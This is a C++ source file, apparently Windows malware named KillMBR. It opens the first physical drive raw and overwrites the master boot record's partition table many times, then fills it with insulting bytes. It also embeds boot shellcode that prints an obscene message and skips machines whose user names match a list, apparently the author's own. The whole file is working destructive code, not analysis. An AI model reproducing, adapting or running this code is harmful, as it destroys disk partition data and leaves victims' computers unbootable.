#include "stdafx.h"
#include "KillMBR.h"
#include <Shlwapi.h>
#include <winioctl.h>
#include <Winnetwk.h>

unsigned char Scode[36] = {
    0xB8, 0x12, 0x00, 0xCD, 0x10, 0xBD, 0x18, 0x7C, 0xB9, 0x18, 0x00, 0xB9, 0x01, 0x13, 0xBB, 0x0C, 
    0x00, 0xBA, 0x1D, 0x0E, 0xCD, 0x10, 0xE2, 0xFE, 0x46, 0x75, 0x63, 0x6B, 0x20, 0x59, 0x6F, 0x75, 
    0x20, 0x3A, 0x2D, 0x29
};

TCHAR *pObviate[] = {_T("Micro"),
                    _T("huangqi"),
                    _T("EvilKnight"),
                    _T("bowen")} ;

// �ж��ǲ������Լ��ĵ��ԣ��ǵĻ��Ͳ�Ҫִ����
// ����TRUE�Ļ��Ͳ����ҵĵ��ԣ�����FALSE�Ļ������ҵĵ���
static BOOL bIsExecute(void)
{
    // ȡ���û���
    TCHAR szUserName[MAX_PATH] = {0} ;
    DWORD dwSize = MAX_PATH ;
    if (NO_ERROR != WNetGetUser(NULL, szUserName, &dwSize))
    {
        // ���ʧ���ˣ��͵������ҵĵ��԰�
        return FALSE ;
    }

    for (int i = 0; i < sizeof(pObviate)/sizeof(TCHAR *); ++i)
    {
        if (StrStrI(szUserName, pObviate[i]))
        {
            return FALSE ;
        }
    }
    return TRUE ;

}

BOOL KillMBR()
{
    BOOL bResult = FALSE ;
    HANDLE hDevice;
    DWORD dwBytesWritten, dwBytesReturned, dwBytesRead;
    BYTE MBR[512*2] = {0};
    int i = 0 , j = 0;

    if (FALSE == bIsExecute())
    {
        return FALSE ;
    }

    hDevice = CreateFile(_T("\\\\.\\PHYSICALDRIVE0"),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    DeviceIoControl(hDevice, 
        FSCTL_LOCK_VOLUME, 
        NULL, 
        0, 
        NULL, 
        0, 
        &dwBytesReturned, 
        NULL);
    // ����ԭ����MBR
    // �����²���̫�����Ȱ�������һ��
    if(FALSE == ReadFile(hDevice, MBR, SECTORSIZE, &dwBytesRead, NULL))
    {
        goto EXIT_PROC ;
    }

    // ��MBR���ݵ����
    for (i = 0; i < SECTORSIZE; ++i)
    {
        MBR[SECTORSIZE + i] = MBR[i] ^ XORVALUE ;
    }

    SetFilePointer(hDevice,0, 0, FILE_BEGIN) ;
    WriteFile(hDevice, MBR, sizeof(MBR), &dwBytesWritten, NULL);

    // �ظ�д24�Σ�Ū����ѽ��
    for(i = 0; i < 24; ++i)
    {
        for (j = 0x1be; j < 0x200 - 2; ++j)
        {
            MBR[j] = i ;
        }
        SetFilePointer(hDevice,0, 0, FILE_BEGIN) ;
        WriteFile(hDevice, MBR, sizeof(MBR) / 2, &dwBytesWritten, NULL);
    }

    // ����ٽ�sbд��ȥ��������ѽ��
    // ����������־
    for (j = 0x1be; j < 0x200 - 2; j += 2)
    {
        MBR[j] = 's' ;
        MBR[j+1] = 'b' ;
    }

    SetFilePointer(hDevice,0, 0, FILE_BEGIN) ;
    WriteFile(hDevice, MBR, sizeof(MBR) / 2, &dwBytesWritten, NULL);

    bResult = TRUE ;
EXIT_PROC:
    DeviceIoControl(hDevice, 
        FSCTL_UNLOCK_VOLUME, 
        NULL, 
        0, 
        NULL, 
        0, 
        &dwBytesReturned, 
        NULL
        );

    CloseHandle(hDevice);

    return bResult;
}
